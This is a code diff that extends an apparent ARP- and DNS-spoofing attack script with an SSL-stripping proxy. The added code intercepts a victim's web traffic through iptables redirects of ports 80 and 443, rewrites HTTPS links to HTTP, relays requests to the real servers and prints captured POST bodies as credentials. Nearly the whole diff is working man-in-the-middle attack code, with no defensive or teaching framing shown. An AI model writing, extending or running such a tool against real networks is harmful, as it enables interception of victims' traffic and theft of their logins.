@@ -4,6 +4,10 @@ import time
 import os
 import signal
 import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.request
+import urllib.parse
+import re
 
 # CONFIGURATION (ATTACKER MUST SET THESE)
 # NOTE: In a fully-fledged tool, these would come from argparse or network discovery.
@@ -22,6 +26,11 @@ GATEWAY_IP = None
 GATEWAY_MAC = None
 
 STOP_ATTACK = False
+
+# SSL STRIPPING CONFIGURATION
+SSL_STRIP_PORT = 8080
+ssl_strip_server = None
+https_to_http_map = {}
 
 # IPTABLES MANAGEMENT
 
@@ -186,6 +195,189 @@ def start_dns_spoofing():
     )
     return sniff_thread
 
+# SSL STRIPPING FUNCTIONS
+
+class SSLStripHandler(BaseHTTPRequestHandler):
+    """HTTP Proxy handler that strips SSL/TLS from connections."""
+    
+    def log_message(self, format, *args):
+        """Override to customize logging."""
+        print(f"[SSL Strip] {self.address_string()} - {format % args}")
+    
+    def do_GET(self):
+        """Handle GET requests."""
+        self.handle_request('GET')
+    
+    def do_POST(self):
+        """Handle POST requests."""
+        self.handle_request('POST')
+    
+    def handle_request(self, method):
+        """Core handler for proxying and stripping SSL."""
+        
+        # Extract the requested URL
+        url = self.path
+        
+        print(f"[SSL Strip] Intercepted {method} request: {url}")
+        
+        # Determine if this should be proxied to HTTPS
+        if url.startswith('http://'):
+            # Check if this URL was originally HTTPS
+            original_url = https_to_http_map.get(url, url)
+            if original_url.startswith('https://'):
+                target_url = original_url
+                print(f"[SSL Strip] Mapping back to HTTPS: {target_url}")
+            else:
+                target_url = url
+        else:
+            # Relative URL - need to reconstruct
+            host = self.headers.get('Host', '')
+            target_url = f"https://{host}{url}"
+            print(f"[SSL Strip] Reconstructed URL: {target_url}")
+        
+        try:
+            # Prepare headers for the upstream request
+            headers = {}
+            for header, value in self.headers.items():
+                if header.lower() not in ['host', 'connection', 'proxy-connection']:
+                    headers[header] = value
+            
+            # Handle POST data if present
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = None
+            if method == 'POST' and content_length > 0:
+                post_data = self.rfile.read(content_length)
+                print(f"[SSL Strip] POST data captured ({content_length} bytes)")
+                # Log credentials if present
+                if post_data:
+                    try:
+                        decoded_data = post_data.decode('utf-8')
+                        print(f"[SSL Strip] POST Data: {decoded_data}")
+                    except:
+                        print(f"[SSL Strip] Binary POST data")
+            
+            # Make the request to the real server (using HTTPS)
+            req = urllib.request.Request(target_url, data=post_data, headers=headers)
+            
+            with urllib.request.urlopen(req, timeout=10) as response:
+                # Read the response
+                response_data = response.read()
+                response_headers = response.headers
+                
+                # Modify the response to strip SSL references
+                if 'text/html' in response_headers.get('Content-Type', ''):
+                    response_text = response_data.decode('utf-8', errors='ignore')
+                    
+                    # Replace HTTPS links with HTTP
+                    modified_text = re.sub(
+                        r'https://',
+                        'http://',
+                        response_text,
+                        flags=re.IGNORECASE
+                    )
+                    
+                    # Track the mappings
+                    https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
+                    for https_url in https_urls:
+                        http_url = https_url.replace('https://', 'http://')
+                        https_to_http_map[http_url] = https_url
+                    
+                    response_data = modified_text.encode('utf-8')
+                    print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
+                
+                # Send the response back to the victim
+                self.send_response(200)
+                
+                # Forward relevant headers
+                for header, value in response_headers.items():
+                    if header.lower() not in ['transfer-encoding', 'content-encoding']:
+                        self.send_header(header, value)
+                
+                self.send_header('Content-Length', len(response_data))
+                self.end_headers()
+                self.wfile.write(response_data)
+                
+                print(f"[SSL Strip] Response sent ({len(response_data)} bytes)")
+        
+        except Exception as e:
+            print(f"[SSL Strip] Error handling request: {e}")
+            self.send_error(502, f"Bad Gateway: {str(e)}")
+
+
+def start_ssl_strip():
+    """Start the SSL stripping proxy server."""
+    global ssl_strip_server
+    
+    print(f"[SSL Strip] Starting SSL stripping proxy on port {SSL_STRIP_PORT}")
+    
+    try:
+        ssl_strip_server = HTTPServer(('', SSL_STRIP_PORT), SSLStripHandler)
+        
+        # Run in a separate thread
+        strip_thread = threading.Thread(target=ssl_strip_server.serve_forever)
+        strip_thread.daemon = True
+        strip_thread.start()
+        
+        print(f"[SSL Strip] Proxy server running on port {SSL_STRIP_PORT}")
+        return strip_thread
+        
+    except Exception as e:
+        print(f"[SSL Strip] Failed to start proxy: {e}")
+        return None
+
+
+def setup_ssl_strip_iptables():
+    """Configure iptables to redirect HTTP traffic to the SSL strip proxy."""
+    
+    # Redirect victim's HTTP traffic (port 80) to our proxy (port 8080)
+    redirect_cmd = (
+        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
+        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    )
+    
+    print(f"[SSL Strip] Setting up iptables redirect: {redirect_cmd}")
+    os.system(redirect_cmd)
+    
+    # Also redirect HTTPS traffic to HTTP proxy (force downgrade)
+    redirect_https_cmd = (
+        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 "
+        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    )
+    
+    print(f"[SSL Strip] Setting up HTTPS redirect: {redirect_https_cmd}")
+    os.system(redirect_https_cmd)
+
+
+def cleanup_ssl_strip_iptables():
+    """Remove SSL stripping iptables rules."""
+    
+    # Remove HTTP redirect
+    remove_http_cmd = (
+        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
+        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    )
+    print(f"[SSL Strip] Removing HTTP redirect")
+    os.system(remove_http_cmd)
+    
+    # Remove HTTPS redirect
+    remove_https_cmd = (
+        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 443 "
+        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    )
+    print(f"[SSL Strip] Removing HTTPS redirect")
+    os.system(remove_https_cmd)
+
+
+def stop_ssl_strip():
+    """Stop the SSL stripping server."""
+    global ssl_strip_server
+    
+    if ssl_strip_server:
+        print("[SSL Strip] Stopping proxy server...")
+        ssl_strip_server.shutdown()
+        ssl_strip_server = None
+
+
 # MAIN EXECUTION AND CLEANUP 
 
 def setup_and_run():
@@ -225,8 +417,13 @@ def setup_and_run():
     dns_thread = start_dns_spoofing()
     dns_thread.daemon = True
     dns_thread.start()
+    
+    # Start SSL Stripping
+    setup_ssl_strip_iptables()
+    ssl_thread = start_ssl_strip()
+    print("[SSL Strip] SSL stripping attack activated.")
 
-    return arp_thread, dns_thread
+    return arp_thread, dns_thread, ssl_thread
 
 def cleanup():
     """Handles graceful shutdown and resource cleanup."""
@@ -243,6 +440,10 @@ def cleanup():
 
     # Wait briefly for sniffing thread to catch the signal and stop
     time.sleep(1)
+    
+    # Stop SSL stripping
+    stop_ssl_strip()
+    cleanup_ssl_strip_iptables()
     
     # Restore ARP tables
     if GATEWAY_IP and VICTIM_MAC:
@@ -266,10 +467,11 @@ if __name__ == "__main__":
 
     arp_thread = None
     dns_thread = None
+    ssl_thread = None
     
     try:
         # Start the attack sequence
-        arp_thread, dns_thread = setup_and_run()
+        arp_thread, dns_thread, ssl_thread = setup_and_run()
         
         # Keep the main thread alive until user interruption
         # When cleanup sets STOP_ATTACK, this loop will break
